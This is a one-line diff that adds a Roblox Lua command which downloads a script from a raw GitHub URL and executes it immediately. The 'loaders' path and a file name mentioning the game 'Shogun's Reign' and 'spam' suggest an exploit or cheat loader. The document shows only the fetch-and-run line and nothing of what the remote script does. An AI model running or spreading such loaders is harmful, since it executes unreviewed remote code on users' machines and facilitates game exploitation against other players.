@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/shogun-s-reign-spam3-y7s20k9zgx56pq.lua"))()
